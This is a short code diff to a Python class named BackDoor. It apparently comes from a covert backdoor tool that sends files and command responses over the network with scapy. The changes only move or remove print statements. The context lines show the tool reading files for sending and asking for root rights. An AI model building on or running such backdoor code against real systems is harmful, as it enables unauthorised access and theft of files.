@@ -239,9 +239,9 @@ class BackDoor:
         if path:
             filename = path.split("/")[-1]
             print(f"Sending file: {filename}")
-            print("--------------------------------------------------")
             binary_data = self.get_file_bin(path)
         else:
+            print("Sent response!")
             binary_data = self.get_bin(data)
 
         if self.proto == "tcp":
@@ -320,7 +320,6 @@ class BackDoor:
         """Sends packets"""
         try:
             send(packets, verbose=0)
-            print("Sent response!")
             print("--------------------------------------------------------------")
         except PermissionError:
             print("Permission error! Run as sudo or admin!")
